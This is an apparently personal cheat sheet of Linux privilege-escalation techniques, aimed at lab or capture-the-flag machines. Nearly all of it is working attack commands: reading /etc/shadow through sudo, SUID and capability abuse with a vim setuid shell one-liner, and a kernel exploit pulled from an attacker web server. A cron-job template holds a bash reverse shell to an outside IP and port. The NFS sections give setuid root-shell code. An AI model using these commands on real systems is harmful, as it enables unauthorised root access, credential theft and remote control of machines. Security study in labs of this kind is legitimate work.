to check python version in target "which python"

#### Try
```bash
start an interactive login shell as the root user
sudo -i
```
#### Aproach
```bash
1) check sudo -l  and if there is any /bin/bash -> we can do horizontal escalation -> sudo -u user2 /bin/bash
2) check ssh. follow
save as id_rsa in local machine
chmod  600 id_rsa
ssh root@ip -i id_rsa
if any error
ssh root@ip -p 50706 -i id_rsa
3) wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
cd linpeas

```
#### TIP SUDO -L
```bash
if u get below after sudo -l command
(root) NOPASSWD: /bin/cat

we can exceute below commadn to see contents of any file as a root user

sudo /bin/cat /etc/shadow

```
#### Spin /bin/bash
```bash
sudo -u user2 /bin/bash
```
#### Exploiting Kernel
```bash
ssh target@ip
targrt machine
cat /proc/version -> search exploits for this version -> download in local machine
attacker machine
sudo python3 -m http.server
target machine
wget http://ip/file.c
gcc file.c -o ofc
chmod +x ofc
./ofc
whoami -> root access
```
#### SUDO
```bash
Which commands user can run with sudo privileges
ssh target@ip
sudo -l
check gtfobins site
search -> click on shell -> click on sudo
copy that command and execute with sudo <commands from gtfobins>
```
#### SUID
```bash
To check which files are executing as a root
here we will check which files have SUID bit set
find / -type f -perm -04000 -ls 2>/dev/null
here we will get files which we can open as sudo
check these received files in GTFObins
check SUID
input file to read which file we want to read as a root but currently not reading due to no privileges

Ex : base64 /path/to/input-file | base64 --decode
```
#### Capabilities
```bash
capabilities will give root shell
ssh target@ip
getcap -r / 2>/dev/null
search in gtfobins
paste in target machine
change python version py to py3 or any other version

/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
/home/karen/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
#### Cron Jobs
```bash
thes Cron Jobs will run as root
target
cat /etc/crontab
check if there is any jobs running as root user (ex : /home/karen/backup.sh)
we can keep any files(reverse shell payloads) in this backup.sh and run as root
cd
backup.sh
keep bash reverse shell (check which bash)(PFA reverse shell commands)

# Template
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.49.124.158/9999 0>&1
```
#### NFS
```bash
attacker machine
nmap -sV —p 2049 IP/Subnet
sudo apt-get install nfs-common
check available mounts
showmount -e <Target_IP>

Target machine
cat /etc/exports
- check whethe we have rw and no_root_squash for the logged in user

Attacker machine
mkdir /tmp/nfs
mount -o rw <target ip>:/folder /tmp/nfs
mount | grep /tmp( check with this command whenther above command is successful or not)
cd /tmp/nfs
nano code.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(void)
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}

gcc -static code.c -o code
chmod +xs code

target machine
cd /home/backup/sharefolder
ls
./code
boom root access

```

#### NFS 2.0
```bash
### Perform vertical privilege escalation of a root user, and enter the flag
Exploiting misconfigured NFS (port 2049)

* `nmap -sV —p 2049 IP/Subnet`
* `sudo apt-get install nfs-common`
* `nmap -sV —script=nfs-showmount <Target_IP>`
* check available mounts: `showmount -e <Target_IP>` -> we will see /home directory
* `mkdir /tmp/nfs`
* `sudo mount -t nfs 10.10.1.9:/home /tmp/nfs`
* `cd /tmp/nfs`
* `sudo cp /bin/bash .`
* `sudo chmod +s bash` -> it will be highlighted in red
* `ls -la`
* `sudo df -h`
* `sudo chmod +s bash`

after them, In another terminal:

* Access to target using SSH
ssh smith@192.168.0.x
* `./bash -p` and we're root!
* `cd /home`
* `ls -la`
* Find the flag: `find / -name "*.txt" -ls 2> /dev/null`
```
